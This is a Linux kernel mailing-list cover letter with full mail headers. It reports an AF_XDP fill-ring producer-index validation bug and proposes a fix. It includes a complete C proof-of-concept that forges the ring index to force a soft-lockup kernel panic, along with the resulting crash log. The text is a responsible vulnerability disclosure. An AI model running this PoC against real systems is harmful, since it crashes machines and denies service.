Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=74.125.82.181
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792655911;
	b=ZCDIEam/L8qOTJnEWAv1yjNrknssPZuRxHzgeBRHs8nBuIIdlYtpSpq3w5GBWiVh4cH+
	 fkeyuYk59nZyKFzhreVtzu6d5CsTd9ITnmTXGQmJQjxt4SaOVPbUL+Y3Qw702hk0Vy/Xy
	 3QKkV2HuddPyAimWBeieiMtoH0aq8I6Lx7oionwUxI8hlntw+ubUrsQwj4pGKNePogkrP
	 x9B6w2UT54gJHE3e44rMBX/jhNIqUJzOsz++tedgB7AdK88iakuftMCaRmh8LXM8uQw5c
	 Pc2kL5EpZ8EDF9Jv7//GT1dNw0vdb8HcfPiNMdeYWgn4jTHRBKkXV1lKmP1UgzZXtAQ==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792655911;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
	 Content-Transfer-Encoding;
	bh=cZ8fRitcz9gVThVAm/Jpn2EdigP1/EYC1jv9qOOEsdk=;
	b=NFF/Y/TxW9ILrxIy1CjFeNGYrIQbJnl96rcwtlrLzb/LqouAXSgkKhoIx8JvS1oU0z3z
	 8uKbXvdNcow24lhXuuiVx1sI7FLumLiUoqJKi6Rc/1vVDPU5U6P8/vFdcEyRS1io5CXn7
	 K70Weu0Rh8esL74N/okcsJRiSpIE3vgWojYGyF1HjT8EpICToOq5sOW3kkudYOJ44cTWT
	 F9hg8xoyTGUwrAP94w1OlgnAJVyLMscEYhUojC1c24JIhqO5OFkKw2Iyt/5vSV95pev5H
	 0dgmxxitJY6ycvNLhoEIYCehZoXIWSm+pzdRId9dOYaWazBYdmEf1bgWQgHLkctue+w==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=AkEDA8xd;
	arc=none smtp.remote-ip=74.125.82.181
Received: from mail-dy1-f181.google.com (mail-dy1-f181.google.com [74.125.82.181])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C7073606A31F
	for <bpf@vger.kernel.org>; Thu, 22 Oct 2026 07:58:30 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org C7073606A31F
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=AkEDA8xd
Received: by mail-dy1-f181.google.com with SMTP id 5a478bee46e88-36681e85e87so3329007eec.1
        for <bpf@vger.kernel.org>; Thu, 22 Oct 2026 00:58:30 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792655910; x=1793260710; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=cZ8fRitcz9gVThVAm/Jpn2EdigP1/EYC1jv9qOOEsdk=;
        b=AkEDA8xdZjBOKHd0AJTWKB0qDJKPiqAym9gBKtlB8w0Lhrh8pfDBcoyuv94kNWYNcH
         9Hr6EuLa38iT2MhSXWtgXiH54x3H6ety2PVl5jp3QddwGfevtaGOO3Gevo07kR83VarR
         UCznTHn1c1Bigol17fd1deTu/Y4/OmdoVPXV6+4hSINNXMCyf+Pxc6T9MICXzCUpnEyH
         lo6uJWqtUCqWjsV3fRBSy5z18xVZLK+5zUbCWAgsY6aeNhRQPKWFMK1mjW43RG3yieNg
         wj2b8DqtBF/+3zOFM/KCYsxZaaX0BJTq8PnTcRM0v2rOoY97RydcOWaQ4OAFCCmKMnVa
         GfTw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792655910; x=1793260710;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=cZ8fRitcz9gVThVAm/Jpn2EdigP1/EYC1jv9qOOEsdk=;
        b=gdNjTDt5xLkX69uzgF5AX+3ZHeHFMG/UG+ue+iusqZr4vsq8XZuwP34xQziFer/can
         RXIAcXzW9Rp5Qizsl0WZT2KunjUX0hjVIt5ap4JyY0JYTA3/fXJe5uOmrjHr1otMHLhO
         fdBau5qAh2fD0FEFv4dv4xQFmuboWGSc1Tp672qUO7QmigjNI2QX3wdkYHZUar9TlZ8q
         N59Oi8S9eSE+RG7M/mxATmzh93gj1WXF7fe2AouJhlZ3BttO3um/OOZjr9hr3okIQ5nw
         hOgbjBWN1Yz/7/1iZjhu2IzvUQhs1ppbtyCWGOpcDSdvR0mvF9gpAfp577KODEG/V99P
         RoqQ==
X-Forwarded-Encrypted: i=1; AKwUvBzQcF65tI4Qptkh15MWTzDnD/sH2TlRi/bEUnv34bGeinQgz9LLDUnSWz7/2sSU6hlfMrw=@vger.kernel.org
X-Gm-Message-State: AFq9FYKi7MgNjJhIaFOfFblH1D6zSDY53URmghK56xK+svqz/sVAYTbi
	JZPwtcb1EEfAuU0M/RLu8GjpSBhUFeVlaob8N2Nnh9QwErDGA4Gv15M80vpqseWy/nN9
X-Gm-Gg: AYBFou2qSUWArfscIRK0ne1ulAeDBqmbP96SGnqZevhlVfUCwoxCzMXsKw81aMhg7Po
	7cg8YTX9iExHJjo9+9Xme0+oJe7w9myWpXNcOhO0ewB5TWgf4V9KA9+QVBA8QMDSqE8NzKbBI8U
	mH5FaWz+cnix+HT4sexb6TGoXJn6rEdZIKzC1OooHEprSY7UA48IVIVWycphw4GPu6lu/nsXa5T
	f8fJZyJD8BpNjXTxSTsV/9UygVoXHVcMN6wjY6o4oa5gtG/RgJIztvhmEDARuftGEG/DfUAffVN
	LedcpTOSOw10Bst42nt+DcXxuN2mYgHYPDchS4sBGIGTY7w2dcKXBo68Qqm7GXNyZJub+qWjc55
	dXOBe2Xeb09T4n9H4Q0BgX4ypqJMO90xujwusp4g5KkIv7IhzyOm/MqIM9CC7eF1VdgVLkLrkaB
	LvJ6MiAZPkW9EoAghzHf1sRi6MZ1IVcq940Kt1rdXwWMWuz36q44gMyhtHCDGVJmhV7agLlhwUX
	VfpicGcpbJaEyGnGksc4DgSjiYTEZWyLIHQpKwd2ekTGR5opNrwbRfEPTQL+uwCVgYSSu0=
X-Received: by 2002:a05:693c:88d6:20b0:366:e24d:a0f6 with SMTP id 5a478bee46e88-3674e93db10mr6348489eec.29.1792655909585;
        Thu, 22 Oct 2026 00:58:29 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([203.175.14.54])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-367417a2fadsm13580451eec.21.2026.10.22.00.58.24
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 22 Oct 2026 00:58:29 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netdev@vger.kernel.org,
	bpf@vger.kernel.org
Cc: magnus.karlsson@intel.com,
	maciej.fijalkowski@intel.com,
	sdf@fomichev.me,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	ast@kernel.org,
	daniel@iogearbox.net,
	hawk@kernel.org,
	john.fastabend@gmail.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] xsk: validate fill-ring producer index
Date: Thu, 22 Oct 2026 15:58:17 +0800
Message-ID: <cover.1792654486.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.55.0
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Post: <mailto:bpf@vger.kernel.org>
List-Help: <mailto:bpf+help@vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
List-Owner: <mailto:bpf+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/xdp/xsk_queue.h. A process with
permissions to create and attach the required XDP program and AF_XDP
socket can forge the fill-ring producer index and cause a long kernel
loop while handling a packet. The supplied reproducer was run as root in
the QEMU guest.

This bug is tracked at: https://bugtracker.nebusec.ai/f/13760

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

__xskq_cons_peek() reads the fill-ring producer index from userspace
without validating that producer - cached_cons is no greater than the
ring capacity. __xp_alloc() consumes invalid fill descriptors one at a
time until cached_prod is reached. With a one-entry ring containing an
invalid address and producer set to UINT_MAX, each iteration reads the
same masked descriptor while advancing cached_cons, yielding billions of
iterations in the packet receive path. In generic XDP mode this occurs
under the AF_XDP RX lock in softirq context and can trigger a soft-lockup
watchdog panic.

Treat producer values whose distance exceeds q->nentries as an empty
queue. Valid ring wraparound remains handled by unsigned index
subtraction, and the consumer does not process beyond the ring capacity.

Reproducer:

    gcc -O2 -Wall -o poc poc.c -lbpf
    ./poc

The PoC sets the watchdog sysctls, creates a veth pair and a one-entry
AF_XDP fill ring, forges producer = UINT_MAX with an invalid descriptor,
and sends one packet through a generic XDP redirect. It requires libbpf
and privileges to create the XSKMAP and attach the XDP program. We run
the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

    #define _GNU_SOURCE

    #include <arpa/inet.h>
    #include <bpf/bpf.h>
    #include <bpf/libbpf.h>
    #include <errno.h>
    #include <fcntl.h>
    #include <linux/bpf.h>
    #include <linux/if_link.h>
    #include <linux/if_xdp.h>
    #include <net/if.h>
    #include <netinet/in.h>
    #include <signal.h>
    #include <stdarg.h>
    #include <stdbool.h>
    #include <stdint.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/socket.h>
    #include <sys/syscall.h>
    #include <sys/types.h>
    #include <sys/wait.h>
    #include <time.h>
    #include <unistd.h>

    #ifndef SOL_XDP
    #define SOL_XDP 283
    #endif

    #ifndef AF_XDP
    #define AF_XDP 44
    #endif

    #ifndef PF_XDP
    #define PF_XDP AF_XDP
    #endif

    #ifndef BPF_PSEUDO_MAP_FD
    #define BPF_PSEUDO_MAP_FD 1
    #endif

    #define UMEM_SIZE 4096
    #define CHUNK_SIZE 2048
    #define FRAME_HEADROOM 0
    #define RING_SIZE 1

    #define BPF_MOV64_IMM(DST, IMM) \
    	((struct bpf_insn) { \
    		.code = BPF_ALU64 | BPF_MOV | BPF_K, \
    		.dst_reg = DST, \
    		.src_reg = 0, \
    		.off = 0, \
    		.imm = IMM, \
    	})

    #define BPF_LD_IMM64_RAW(DST, SRC, IMM) \
    	((struct bpf_insn) { \
    		.code = BPF_LD | BPF_DW | BPF_IMM, \
    		.dst_reg = DST, \
    		.src_reg = SRC, \
    		.off = 0, \
    		.imm = (__u32)(IMM), \
    	}), \
    	((struct bpf_insn) { \
    		.code = 0, \
    		.dst_reg = 0, \
    		.src_reg = 0, \
    		.off = 0, \
    		.imm = ((__u64)(IMM)) >> 32, \
    	})

    #define BPF_LD_MAP_FD(DST, MAP_FD) \
    	BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)

    #define BPF_EMIT_CALL(FUNC) \
    	((struct bpf_insn) { \
    		.code = BPF_JMP | BPF_CALL, \
    		.dst_reg = 0, \
    		.src_reg = 0, \
    		.off = 0, \
    		.imm = FUNC, \
    	})

    #define BPF_EXIT_INSN() \
    	((struct bpf_insn) { \
    		.code = BPF_JMP | BPF_EXIT, \
    		.dst_reg = 0, \
    		.src_reg = 0, \
    		.off = 0, \
    		.imm = 0, \
    	})

    struct xsk_ring_map {
    	void *base;
    	__u32 *producer;
    	__u32 *consumer;
    	__u32 *flags;
    	__u64 *desc;
    	size_t map_len;
    };

    struct poc_ctx {
    	char if_in[IFNAMSIZ];
    	char if_peer[IFNAMSIZ];
    	int ifindex;
    	int map_fd;
    	int prog_fd;
    	int xsk_fd;
    	void *umem;
    	struct xsk_ring_map fill;
    	struct xsk_ring_map comp;
    	void *rx_map;
    	size_t rx_map_len;
    	bool xdp_attached;
    	bool created_link;
    	bool set_watchdog;
    	bool no_sysctls;
    	bool exit_after_send;
    	uint32_t forged_producer;
    };

    static struct poc_ctx *global_ctx;

    static void die(const char *fmt, ...)
    {
    	va_list ap;

    	va_start(ap, fmt);
    	vfprintf(stderr, fmt, ap);
    	va_end(ap);
    	fputc('\n', stderr);
    	exit(1);
    }

    static void die_errno(const char *what)
    {
    	die("%s: %s", what, strerror(errno));
    }

    static int sys_bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size)
    {
    	return syscall(__NR_bpf, cmd, attr, size);
    }

    static int write_file(const char *path, const char *val)
    {
    	int fd, ret;

    	fd = open(path, O_WRONLY | O_CLOEXEC);
    	if (fd < 0)
    		return -1;

    	ret = write(fd, val, strlen(val));
    	close(fd);
    	return ret < 0 ? -1 : 0;
    }

    static void try_set_watchdog_sysctls(struct poc_ctx *ctx)
    {
    	if (ctx->no_sysctls)
    		return;

    	if (!write_file("/proc/sys/kernel/panic_on_warn", "0\n") &&
    	    !write_file("/proc/sys/kernel/softlockup_panic", "1\n") &&
    	    !write_file("/proc/sys/kernel/watchdog_thresh", "5\n")) {
    		ctx->set_watchdog = true;
    		fprintf(stderr,
    			"[+] Set panic_on_warn=0, softlockup_panic=1, watchdog_thresh=5\n");
    		return;
    	}

    	fprintf(stderr,
    		"[!] Failed to tune watchdog sysctls, continuing without them\n");
    }

    static int run_cmd(const char *fmt, ...)
    {
    	char cmd[512];
    	va_list ap;
    	int ret;

    	va_start(ap, fmt);
    	vsnprintf(cmd, sizeof(cmd), fmt, ap);
    	va_end(ap);

    	ret = system(cmd);
    	if (ret == -1)
    		return -1;
    	return WEXITSTATUS(ret);
    }

    static void cleanup(void)
    {
    	struct poc_ctx *ctx = global_ctx;

    	if (!ctx)
    		return;

    	if (ctx->xdp_attached)
    		bpf_xdp_detach(ctx->ifindex, XDP_FLAGS_SKB_MODE, NULL);
    	if (ctx->prog_fd >= 0)
    		close(ctx->prog_fd);
    	if (ctx->map_fd >= 0)
    		close(ctx->map_fd);
    	if (ctx->xsk_fd >= 0)
    		close(ctx->xsk_fd);
    	if (ctx->fill.base)
    		munmap(ctx->fill.base, ctx->fill.map_len);
    	if (ctx->comp.base)
    		munmap(ctx->comp.base, ctx->comp.map_len);
    	if (ctx->rx_map)
    		munmap(ctx->rx_map, ctx->rx_map_len);
    	if (ctx->umem)
    		munmap(ctx->umem, UMEM_SIZE);
    	if (ctx->created_link)
    		run_cmd("ip link del %s >/dev/null 2>&1", ctx->if_in);
    }

    static void on_signal(int signo)
    {
    	(void)signo;
    	_exit(128 + signo);
    }

    static void install_handlers(void)
    {
    	struct sigaction sa = {
    		.sa_handler = on_signal,
    	};

    	sigemptyset(&sa.sa_mask);
    	sigaction(SIGINT, &sa, NULL);
    	sigaction(SIGTERM, &sa, NULL);
    	atexit(cleanup);
    }

    static void setup_links(struct poc_ctx *ctx)
    {
    	unsigned int id = getpid() % 10000;

    	snprintf(ctx->if_in, sizeof(ctx->if_in), "xskp%04u", id);
    	snprintf(ctx->if_peer, sizeof(ctx->if_peer), "xskq%04u", id);

    	run_cmd("ip link del %s >/dev/null 2>&1", ctx->if_in);
    	run_cmd("ip link del %s >/dev/null 2>&1", ctx->if_peer);

    	if (run_cmd("ip link add %s numtxqueues 1 numrxqueues 1 type veth peer name %s numtxqueues 1 numrxqueues 1",
    		    ctx->if_in, ctx->if_peer))
    		die("failed to create veth pair");
    	ctx->created_link = true;

    	if (run_cmd("ip addr add 10.23.0.1/24 dev %s", ctx->if_in) ||
    	    run_cmd("ip addr add 10.23.0.2/24 dev %s", ctx->if_peer) ||
    	    run_cmd("ip link set %s up", ctx->if_in) ||
    	    run_cmd("ip link set %s up", ctx->if_peer))
    		die("failed to configure veth pair");

    	ctx->ifindex = if_nametoindex(ctx->if_in);
    	if (!ctx->ifindex)
    		die_errno("if_nametoindex");

    	fprintf(stderr, "[+] Using %s (ifindex %d) and peer %s\n",
    		ctx->if_in, ctx->ifindex, ctx->if_peer);
    }

    static int create_xskmap(void)
    {
    	union bpf_attr attr;

    	memset(&attr, 0, sizeof(attr));
    	attr.map_type = BPF_MAP_TYPE_XSKMAP;
    	attr.key_size = sizeof(__u32);
    	attr.value_size = sizeof(__u32);
    	attr.max_entries = 1;
    	memcpy(attr.map_name, "xsks_map", sizeof("xsks_map"));

    	return sys_bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
    }

    static int load_xdp_prog(int map_fd)
    {
    	static char log_buf[65536];
    	struct bpf_insn prog[] = {
    		BPF_LD_MAP_FD(BPF_REG_1, map_fd),
    		BPF_MOV64_IMM(BPF_REG_2, 0),
    		BPF_MOV64_IMM(BPF_REG_3, XDP_PASS),
    		BPF_EMIT_CALL(BPF_FUNC_redirect_map),
    		BPF_EXIT_INSN(),
    	};
    	union bpf_attr attr;

    	memset(&attr, 0, sizeof(attr));
    	attr.prog_type = BPF_PROG_TYPE_XDP;
    	attr.insn_cnt = sizeof(prog) / sizeof(prog[0]);
    	attr.insns = (uintptr_t)prog;
    	attr.license = (uintptr_t)"GPL";
    	attr.log_buf = (uintptr_t)log_buf;
    	attr.log_size = sizeof(log_buf);
    	attr.log_level = 1;

    	map_fd = sys_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    	if (map_fd < 0)
    		fprintf(stderr, "%s\n", log_buf);
    	return map_fd;
    }

    static void attach_xdp(struct poc_ctx *ctx)
    {
    	int err;

    	err = bpf_xdp_attach(ctx->ifindex, ctx->prog_fd,
    			     XDP_FLAGS_SKB_MODE | XDP_FLAGS_UPDATE_IF_NOEXIST,
    			     NULL);
    	if (err)
    		die("bpf_xdp_attach: %s", strerror(-err));
    	ctx->xdp_attached = true;
    	fprintf(stderr, "[+] Attached generic XDP redirect program to %s\n",
    		ctx->if_in);
    }

    static void map_ring(void *base, const struct xdp_ring_offset *off,
    		     struct xsk_ring_map *ring, size_t entries, bool fill_ring)
    {
    	ring->base = base;
    	ring->producer = base + off->producer;
    	ring->consumer = base + off->consumer;
    	ring->flags = base + off->flags;
    	ring->desc = base + off->desc;
    	ring->map_len = off->desc + entries * (fill_ring ? sizeof(__u64) :
    						    sizeof(struct xdp_desc));
    }

    static void setup_xsk(struct poc_ctx *ctx)
    {
    	struct sockaddr_xdp sxdp;
    	struct xdp_mmap_offsets off;
    	struct xdp_umem_reg mr;
    	socklen_t optlen;
    	int entries = RING_SIZE;

    	ctx->xsk_fd = socket(AF_XDP, SOCK_RAW | SOCK_CLOEXEC, 0);
    	if (ctx->xsk_fd < 0)
    		die_errno("socket(AF_XDP)");

    	ctx->umem = mmap(NULL, UMEM_SIZE, PROT_READ | PROT_WRITE,
    			 MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    	if (ctx->umem == MAP_FAILED)
    		die_errno("mmap(umem)");

    	memset(&mr, 0, sizeof(mr));
    	mr.addr = (uintptr_t)ctx->umem;
    	mr.len = UMEM_SIZE;
    	mr.chunk_size = CHUNK_SIZE;
    	mr.headroom = FRAME_HEADROOM;
    	if (setsockopt(ctx->xsk_fd, SOL_XDP, XDP_UMEM_REG, &mr, sizeof(mr)))
    		die_errno("setsockopt(XDP_UMEM_REG)");
    	if (setsockopt(ctx->xsk_fd, SOL_XDP, XDP_UMEM_FILL_RING, &entries, sizeof(entries)))
    		die_errno("setsockopt(XDP_UMEM_FILL_RING)");
    	if (setsockopt(ctx->xsk_fd, SOL_XDP, XDP_UMEM_COMPLETION_RING, &entries, sizeof(entries)))
    		die_errno("setsockopt(XDP_UMEM_COMPLETION_RING)");
    	if (setsockopt(ctx->xsk_fd, SOL_XDP, XDP_RX_RING, &entries, sizeof(entries)))
    		die_errno("setsockopt(XDP_RX_RING)");

    	memset(&off, 0, sizeof(off));
    	optlen = sizeof(off);
    	if (getsockopt(ctx->xsk_fd, SOL_XDP, XDP_MMAP_OFFSETS, &off, &optlen))
    		die_errno("getsockopt(XDP_MMAP_OFFSETS)");

    	ctx->fill.base = mmap(NULL, off.fr.desc + RING_SIZE * sizeof(__u64),
    			      PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
    			      ctx->xsk_fd, XDP_UMEM_PGOFF_FILL_RING);
    	if (ctx->fill.base == MAP_FAILED)
    		die_errno("mmap(fill)");
    	map_ring(ctx->fill.base, &off.fr, &ctx->fill, RING_SIZE, true);

    	ctx->comp.base = mmap(NULL, off.cr.desc + RING_SIZE * sizeof(__u64),
    			      PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
    			      ctx->xsk_fd, XDP_UMEM_PGOFF_COMPLETION_RING);
    	if (ctx->comp.base == MAP_FAILED)
    		die_errno("mmap(comp)");
    	map_ring(ctx->comp.base, &off.cr, &ctx->comp, RING_SIZE, true);

    	ctx->rx_map_len = off.rx.desc + RING_SIZE * sizeof(struct xdp_desc);
    	ctx->rx_map = mmap(NULL, ctx->rx_map_len, PROT_READ | PROT_WRITE,
    			   MAP_SHARED | MAP_POPULATE, ctx->xsk_fd, XDP_PGOFF_RX_RING);
    	if (ctx->rx_map == MAP_FAILED)
    		die_errno("mmap(rx)");

    	memset(&sxdp, 0, sizeof(sxdp));
    	sxdp.sxdp_family = PF_XDP;
    	sxdp.sxdp_ifindex = ctx->ifindex;
    	sxdp.sxdp_queue_id = 0;
    	sxdp.sxdp_flags = 0;
    	if (bind(ctx->xsk_fd, (struct sockaddr *)&sxdp, sizeof(sxdp)))
    		die_errno("bind(AF_XDP)");

    	fprintf(stderr, "[+] AF_XDP socket bound to %s queue 0\n", ctx->if_in);
    }

    static void update_xskmap(struct poc_ctx *ctx)
    {
    	__u32 key = 0;

    	if (bpf_map_update_elem(ctx->map_fd, &key, &ctx->xsk_fd, 0))
    		die_errno("bpf_map_update_elem(XSKMAP)");
    	fprintf(stderr, "[+] XSKMAP[0] now points at the AF_XDP socket\n");
    }

    static void forge_fill_ring(struct poc_ctx *ctx)
    {
    	ctx->fill.desc[0] = UINT64_MAX;
    	__sync_synchronize();
    	*ctx->fill.producer = ctx->forged_producer;
    	__sync_synchronize();
    	fprintf(stderr,
    		"[+] Forged fill ring: desc[0]=0x%016llx producer=%u consumer=%u\n",
    		(unsigned long long)ctx->fill.desc[0], *ctx->fill.producer,
    		*ctx->fill.consumer);
    }

    static void send_trigger_packet(struct poc_ctx *ctx)
    {
    	struct sockaddr_in addr = {
    		.sin_family = AF_INET,
    		.sin_port = htons(1337),
    	};
    	struct timespec start, end;
    	static const char payload[] = "x";
    	int fd;

    	addr.sin_addr.s_addr = htonl(0x0a170001);

    	fd = socket(AF_INET, SOCK_DGRAM, 0);
    	if (fd < 0)
    		die_errno("socket(AF_INET)");

    	if (setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, ctx->if_peer,
    		       strlen(ctx->if_peer) + 1))
    		die_errno("setsockopt(SO_BINDTODEVICE)");

    	fprintf(stderr, "[+] Sending one UDP packet via %s to trigger RX allocation\n",
    		ctx->if_peer);
    	clock_gettime(CLOCK_MONOTONIC, &start);
    	if (sendto(fd, payload, sizeof(payload), 0,
    		   (struct sockaddr *)&addr, sizeof(addr)) < 0)
    		die_errno("sendto");
    	clock_gettime(CLOCK_MONOTONIC, &end);
    	close(fd);
    	fprintf(stderr, "[+] sendto() returned after %.3f seconds\n",
    		(end.tv_sec - start.tv_sec) +
    		(end.tv_nsec - start.tv_nsec) / 1000000000.0);
    }

    static void usage(const char *prog)
    {
    	fprintf(stderr,
    		"Usage: %s [--producer N] [--no-sysctls] [--exit-after-send]\n"
    		"  --producer N   Forged fill-ring producer value (default UINT_MAX)\n"
    		"  --no-sysctls   Skip watchdog/panic sysctl tuning\n",
    		prog);
    }

    int main(int argc, char **argv)
    {
    	struct poc_ctx ctx = {
    		.map_fd = -1,
    		.prog_fd = -1,
    		.xsk_fd = -1,
    		.forged_producer = UINT32_MAX,
    	};
    	int i;

    	for (i = 1; i < argc; i++) {
    		if (!strcmp(argv[i], "--producer")) {
    			char *endp;
    			unsigned long long v;

    			if (++i >= argc)
    				die("--producer requires an argument");
    			v = strtoull(argv[i], &endp, 0);
    			if (*endp || v > UINT32_MAX)
    				die("invalid producer value: %s", argv[i]);
    			ctx.forged_producer = v;
    		} else if (!strcmp(argv[i], "--no-sysctls")) {
    			ctx.no_sysctls = true;
    		} else if (!strcmp(argv[i], "--exit-after-send")) {
    			ctx.exit_after_send = true;
    		} else {
    			usage(argv[0]);
    			return 1;
    		}
    	}

    	global_ctx = &ctx;
    	install_handlers();
    	try_set_watchdog_sysctls(&ctx);
    	setup_links(&ctx);

    	ctx.map_fd = create_xskmap();
    	if (ctx.map_fd < 0)
    		die_errno("BPF_MAP_CREATE(XSKMAP)");

    	ctx.prog_fd = load_xdp_prog(ctx.map_fd);
    	if (ctx.prog_fd < 0)
    		die_errno("BPF_PROG_LOAD(XDP)");

    	attach_xdp(&ctx);
    	setup_xsk(&ctx);
    	update_xskmap(&ctx);
    	forge_fill_ring(&ctx);
    	send_trigger_packet(&ctx);

    	fprintf(stderr, "[+] Trigger packet sent; if the bug is reachable the kernel should now spin in __xp_alloc()\n");
    	if (ctx.exit_after_send)
    		return 0;
    	pause();
    	return 0;
    }

------END poc.c------

----BEGIN crash log----

[  593.167690][    C0] watchdog: BUG: soft lockup - CPU#0 stuck for 13s! [kworker/0:1:11]
[  593.167804][    C0] Modules linked in:
[  593.167883][    C0] CPU: 0 UID: 0 PID: 11 Comm: kworker/0:1 Not tainted 6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
[  593.167928][    C0] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  593.167950][    C0] Workqueue: mld mld_ifc_work
[  593.168064][    C0] RIP: 0010:__pv_queued_spin_lock_slowpath+0x7d2/0xec0
[  593.168229][    C0] Call Trace:
[  593.168236][    C0]  <IRQ>
[  593.168466][    C0]  do_raw_spin_lock+0x1e7/0x270
[  593.168519][    C0]  _raw_spin_lock_bh+0x6d/0x80
[  593.168533][    C0]  xsk_generic_rcv+0x12f/0x420
[  593.168566][    C0]  xdp_do_generic_redirect+0x5d8/0xc30
[  593.168625][    C0]  do_xdp_generic+0x875/0xcf0
[  593.168902][    C0]  __netif_receive_skb_core.constprop.0+0x1570/0x3770
[  593.169262][    C0]  __netif_receive_skb_one_core+0xaf/0x1b0
[  593.169377][    C0]  process_backlog+0x309/0xf00
[  593.169417][    C0]  __napi_poll.constprop.0+0xa7/0x580
[  593.169441][    C0]  net_rx_action+0x4d4/0xc70
[  593.169720][    C0]  do_softirq.part.0+0x3f/0xa0
[  593.169763][    C0]  </IRQ>
[  593.169780][    C0]  <TASK>
[  593.171109][    C0] Kernel panic - not syncing: softlockup: hung tasks
[  593.257697][    C0] CPU: 0 UID: 0 PID: 11 Comm: kworker/0:1 Tainted: G             L   6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
[  593.257960][    C0] Tainted: [L]=SOFTLOCKUP
[  593.258298][    C0] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  593.259618][    C0] Call Trace:
[  593.259908][    C0]  <IRQ>
[  593.260275][    C0]  panic+0x349/0x880
[  593.262191][    C0]  hrtimer_interrupt+0x2cd/0x7e0
[  593.264680][    C0]  sysvec_apic_timer_interrupt+0x38/0x90
[  593.265638][    C0] RIP: 0010:__pv_queued_spin_lock_slowpath+0x7d2/0xec0
[  593.275692][    C0]  do_raw_spin_lock+0x1e7/0x270
[  593.276520][    C0]  _raw_spin_lock_bh+0x6d/0x80
[  593.276911][    C0]  xsk_generic_rcv+0x12f/0x420
[  593.277284][    C0]  xdp_do_generic_redirect+0x5d8/0xc30
[  593.277680][    C0]  do_xdp_generic+0x875/0xcf0
[  593.282674][    C0]  __netif_receive_skb_core.constprop.0+0x1570/0x3770
[  593.294532][    C0]  __netif_receive_skb_one_core+0xaf/0x1b0
[  593.296764][    C0]  process_backlog+0x33c/0xf00
[  593.297424][    C0]  __napi_poll.constprop.0+0xa7/0x580
[  593.297804][    C0]  net_rx_action+0x4d4/0xc70
[  593.299256][    C0]  handle_softirqs+0x282/0x7d0
[  593.300505][    C0]  do_softirq.part.0+0x3f/0xa0
[  593.300910][    C0]  </IRQ>
[  593.301142][    C0]  <TASK>
[  593.301371][    C0]  __local_bh_enable_ip+0x79/0x80
[  593.302175][    C0]  __dev_queue_xmit+0xc0a/0x31d0
[  593.312452][    C0]  ip6_finish_output2+0xc44/0x1c00
[  593.314380][    C0]  ip6_output+0x203/0x5f0
